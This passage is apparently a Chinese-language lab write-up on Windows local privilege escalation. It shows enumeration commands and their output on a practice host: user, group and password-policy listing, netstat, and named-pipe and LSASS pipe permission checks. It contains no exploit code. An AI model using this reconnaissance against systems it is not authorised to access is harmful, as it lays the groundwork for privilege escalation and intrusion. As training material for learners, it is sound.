class="title">Disabled</span></span></span><br></pre></td></tr></table></figure><h3 id="当前用户组信息"><a href="#当前用户组信息" class="headerlink" title="当前用户组信息"></a>当前用户组信息</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">groups</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">GROUP</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function">-----------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Group</span> <span class="title">Name</span>                             <span class="title">Type</span>             <span class="title">SID</span>          <span class="title">Attributes</span></span></span><br><span class="line"><span class="function">====================================== ================ ============ ==================================================</span></span><br><span class="line"><span class="function"><span class="title">Everyone</span>                               <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-1-0      <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">BUILTIN</span>\<span class="title">Remote</span> <span class="title">Desktop</span> <span class="title">Users</span>           <span class="title">Alias</span>            <span class="title">S</span>-1-5-32-555 <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">BUILTIN</span>\<span class="title">Users</span>                          <span class="title">Alias</span>            <span class="title">S</span>-1-5-32-545 <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">REMOTE</span> <span class="title">INTERACTIVE</span> <span class="title">LOGON</span>  <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-14     <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">INTERACTIVE</span>               <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-4      <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Authenticated</span> <span class="title">Users</span>       <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-11     <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">This</span> <span class="title">Organization</span>         <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-15     <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Local</span> <span class="title">account</span>             <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-113    <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">LOCAL</span>                                  <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-2-0      <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">NTLM</span> <span class="title">Authentication</span>       <span class="title">Well</span>-<span class="title">known</span> <span class="title">group</span> <span class="title">S</span>-1-5-64-10  <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span> <span class="title">by</span> <span class="title">default</span>, <span class="title">Enabled</span> <span class="title">group</span></span></span><br><span class="line"><span class="function"><span class="title">Mandatory</span> <span class="title">Label</span>\<span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> <span class="title">Label</span>            <span class="title">S</span>-1-16-8192</span></span><br></pre></td></tr></table></figure><h3 id="所有用户"><a href="#所有用户" class="headerlink" title="所有用户"></a>所有用户</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">user</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">accounts</span> <span class="title">for</span> \\<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span>            <span class="title">DefaultAccount</span>           <span class="title">Guest</span></span></span><br><span class="line"><span class="function"><span class="title">helpdesk</span>                 <span class="title">htb</span>-<span class="title">student</span>              <span class="title">jordan</span></span></span><br><span class="line"><span class="function"><span class="title">sarah</span>                    <span class="title">secsvc</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><h3 id="所有组"><a href="#所有组" class="headerlink" title="所有组"></a>所有组</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">localgroup</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Aliases</span> <span class="title">for</span> \\<span class="title">WINLPE</span>-<span class="title">SRV01</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function">*<span class="title">Access</span> <span class="title">Control</span> <span class="title">Assistance</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">*<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">*<span class="title">Backup</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">*<span class="title">Certificate</span> <span class="title">Service</span> <span class="title">DCOM</span> <span class="title">Access</span></span></span><br><span class="line"><span class="function">*<span class="title">Cryptographic</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">*<span class="title">Distributed</span> <span class="title">COM</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Event</span> <span class="title">Log</span> <span class="title">Readers</span></span></span><br><span class="line"><span class="function">*<span class="title">Guests</span></span></span><br><span class="line"><span class="function">*<span class="title">Hyper</span>-<span class="title">V</span> <span class="title">Administrators</span></span></span><br><span class="line"><span class="function">*<span class="title">IIS_IUSRS</span></span></span><br><span class="line"><span class="function">*<span class="title">Network</span> <span class="title">Configuration</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">*<span class="title">Performance</span> <span class="title">Log</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Performance</span> <span class="title">Monitor</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Power</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Print</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">*<span class="title">RDS</span> <span class="title">Endpoint</span> <span class="title">Servers</span></span></span><br><span class="line"><span class="function">*<span class="title">RDS</span> <span class="title">Management</span> <span class="title">Servers</span></span></span><br><span class="line"><span class="function">*<span class="title">RDS</span> <span class="title">Remote</span> <span class="title">Access</span> <span class="title">Servers</span></span></span><br><span class="line"><span class="function">*<span class="title">Remote</span> <span class="title">Desktop</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Remote</span> <span class="title">Management</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Replicator</span></span></span><br><span class="line"><span class="function">*<span class="title">Storage</span> <span class="title">Replica</span> <span class="title">Administrators</span></span></span><br><span class="line"><span class="function">*<span class="title">System</span> <span class="title">Managed</span> <span class="title">Accounts</span> <span class="title">Group</span></span></span><br><span class="line"><span class="function">*<span class="title">Users</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><h3 id="特定组详情"><a href="#特定组详情" class="headerlink" title="特定组详情"></a>特定组详情</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Alias</span> <span class="title">name</span>     <span class="title">administrators</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        <span class="title">Administrators</span> <span class="title">have</span> <span class="title">complete</span> <span class="title">and</span> <span class="title">unrestricted</span> <span class="title">access</span> <span class="title">to</span> <span class="title">the</span> <span class="title">computer</span>/<span class="title">domain</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">helpdesk</span></span></span><br><span class="line"><span class="function"><span class="title">sarah</span></span></span><br><span class="line"><span class="function"><span class="title">secsvc</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>. </span></span><br></pre></td></tr></table></figure><h3 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">accounts</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Force</span> <span class="title">user</span> <span class="title">logoff</span> <span class="title">how</span> <span class="title">long</span> <span class="title">after</span> <span class="title">time</span> <span class="title">expires</span>?:       <span class="title">Never</span></span></span><br><span class="line"><span class="function"><span class="title">Minimum</span> <span class="title">password</span> <span class="title">age</span> (<span class="title">days</span>):                          0</span></span><br><span class="line"><span class="function"><span class="title">Maximum</span> <span class="title">password</span> <span class="title">age</span> (<span class="title">days</span>):                          42</span></span><br><span class="line"><span class="function"><span class="title">Minimum</span> <span class="title">password</span> <span class="title">length</span>:                              0</span></span><br><span class="line"><span class="function"><span class="title">Length</span> <span class="title">of</span> <span class="title">password</span> <span class="title">history</span> <span class="title">maintained</span>:                <span class="title">None</span></span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">threshold</span>:                                    <span class="title">Never</span></span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">duration</span> (<span class="title">minutes</span>):                           30</span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">observation</span> <span class="title">window</span> (<span class="title">minutes</span>):                 30</span></span><br><span class="line"><span class="function"><span class="title">Computer</span> <span class="title">role</span>:                                        <span class="title">SERVER</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><h3 id="密码策略和其他帐户信息"><a href="#密码策略和其他帐户信息" class="headerlink" title="密码策略和其他帐户信息"></a>密码策略和其他帐户信息</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">accounts</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Force</span> <span class="title">user</span> <span class="title">logoff</span> <span class="title">how</span> <span class="title">long</span> <span class="title">after</span> <span class="title">time</span> <span class="title">expires</span>?:       <span class="title">Never</span></span></span><br><span class="line"><span class="function"><span class="title">Minimum</span> <span class="title">password</span> <span class="title">age</span> (<span class="title">days</span>):                          0</span></span><br><span class="line"><span class="function"><span class="title">Maximum</span> <span class="title">password</span> <span class="title">age</span> (<span class="title">days</span>):                          42</span></span><br><span class="line"><span class="function"><span class="title">Minimum</span> <span class="title">password</span> <span class="title">length</span>:                              0</span></span><br><span class="line"><span class="function"><span class="title">Length</span> <span class="title">of</span> <span class="title">password</span> <span class="title">history</span> <span class="title">maintained</span>:                <span class="title">None</span></span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">threshold</span>:                                    <span class="title">Never</span></span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">duration</span> (<span class="title">minutes</span>):                           30</span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">observation</span> <span class="title">window</span> (<span class="title">minutes</span>):                 30</span></span><br><span class="line"><span class="function"><span class="title">Computer</span> <span class="title">role</span>:                                        <span class="title">SERVER</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure><hr><h1 id="Process-Communication"><a href="#Process-Communication" class="headerlink" title="Process Communication"></a>Process Communication</h1><h2 id="Access-Tokens"><a href="#Access-Tokens" class="headerlink" title="Access Tokens"></a>Access Tokens</h2><p>在 Windows 中，<a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">访问令牌</a>用于描述进程或线程的安全上下文（安全属性或规则）。令牌包含有关用户帐户身份和与特定进程或线程相关的权限的信息。当用户向系统进行身份验证时，系统会根据安全数据库验证其密码，如果验证正确，则会为其分配一个访问令牌。每次用户与进程交互时，都会提供此令牌的副本以确定其权限级别。</p><h2 id="Network-Services"><a href="#Network-Services" class="headerlink" title="Network Services"></a>Network Services</h2><p>与进程交互的最常见方式是通过网络套接字（DNS、HTTP、SMB 等）。netstat<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat">命令</a>将显示活动的 TCP 和 UDP 连接，这将使更好地了解哪些服务正在本地和外部可访问的端口上监听。可能会发现一个只有本地主机可访问的易受攻击的服务（登录到主机时），可以利用它来提升权限。</p><h3 id="活动网络连接"><a href="#活动网络连接" class="headerlink" title="活动网络连接"></a>活动网络连接</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">netstat</span> -<span class="title">ano</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Active</span> <span class="title">Connections</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">Proto</span>  <span class="title">Local</span> <span class="title">Address</span>          <span class="title">Foreign</span> <span class="title">Address</span>        <span class="title">State</span>           <span class="title">PID</span></span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:21             0.0.0.0:0              <span class="title">LISTENING</span>       3812</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:80             0.0.0.0:0              <span class="title">LISTENING</span>       4</span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="命名管道"><a href="#命名管道" class="headerlink" title="命名管道"></a>命名管道</h3><p>进程之间通信的另一种方式是通过命名管道。管道本质上是存储在内存中的文件，读取后会被清除。</p><p>管道有两种类型：<a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes">命名管道</a>和匿名管道。命名管道的一个例子是<code>\\.\PipeName\\ExampleNamedPipeServer</code>。Windows 系统使用客户端-服务器实现进行管道通信。</p><p>Sysinternals Suite 中的工具<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist">PipeList</a>来枚举命名管道的实例</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">pipelist.exe</span> /<span class="title">accepteula</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PipeList</span> <span class="title">v1</span>.02 - <span class="title">Lists</span> <span class="title">open</span> <span class="title">named</span> <span class="title">pipes</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2005-2016 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Pipe</span> <span class="title">Name</span>                                    <span class="title">Instances</span>       <span class="title">Max</span> <span class="title">Instances</span></span></span><br><span class="line"><span class="function">---------                                    ---------       -------------</span></span><br><span class="line"><span class="function"><span class="title">InitShutdown</span>                                      3               -1</span></span><br><span class="line"><span class="function"><span class="title">lsass</span>                                             4               -1</span></span><br><span class="line"><span class="function"><span class="title">ntsvcs</span>                                            3               -1</span></span><br><span class="line"><span class="function"><span class="title">scerpc</span>                                            3               -1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-340-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-414-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">epmapper</span>                                          3               -1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-3<span class="title">ec</span>-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-44<span class="title">c</span>-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">LSM_API_service</span>                                   3               -1</span></span><br><span class="line"><span class="function"><span class="title">atsvc</span>                                             3               -1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-5<span class="title">e0</span>-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">eventlog</span>                                          3               -1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-6<span class="title">a8</span>-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">spoolss</span>                                           3               -1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-<span class="title">ec0</span>-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">wkssvc</span>                                            4               -1</span></span><br><span class="line"><span class="function"><span class="title">trkwks</span>                                            3               -1</span></span><br><span class="line"><span class="function"><span class="title">vmware</span>-<span class="title">usbarbpipe</span>                                 5               -1</span></span><br><span class="line"><span class="function"><span class="title">srvsvc</span>                                            4               -1</span></span><br><span class="line"><span class="function"><span class="title">ROUTER</span>                                            3               -1</span></span><br><span class="line"><span class="function"><span class="title">vmware</span>-<span class="title">authdpipe</span>                                  1                1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure><p>powershell Get-ChildItem 列出命名管道</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  <span class="built_in">gci</span> \\.\pipe\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: \\.\pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">3</span> InitShutdown</span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">4</span> lsass</span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">3</span> ntsvcs</span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">3</span> scerpc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: \\.\pipe\Winsock2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">1</span> Winsock2\CatalogChangeListener<span class="literal">-34c-0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: \\.\pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">3</span> epmapper</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="LSASS-命名管道权限"><a href="#LSASS-命名管道权限" class="headerlink" title="LSASS 命名管道权限"></a>LSASS 命名管道权限</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">accesschk.exe</span> /<span class="title">accepteula</span> \\.\<span class="title">Pipe</span>\<span class="title">lsass</span> -<span class="title">v</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Accesschk</span> <span class="title">v6</span>.12 - <span class="title">Reports</span> <span class="title">effective</span> <span class="title">permissions</span> <span class="title">for</span> <span class="title">securable</span> <span class="title">objects</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2006-2017 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">\\.\<span class="title">Pipe</span>\<span class="title">lsass</span></span></span><br><span class="line"><span class="function">  <span class="title">Untrusted</span> <span class="title">Mandatory</span> <span class="title">Level</span> [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">Everyone</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">SYNCHRONIZE</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">ANONYMOUS</span> <span class="title">LOGON</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">SYNCHRONIZE</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">APPLICATION</span> <span class="title">PACKAGE</span> <span class="title">AUTHORITY</span>\<span class="title">Your</span> <span class="title">Windows</span> <span class="title">credentials</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">SYNCHRONIZE</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span 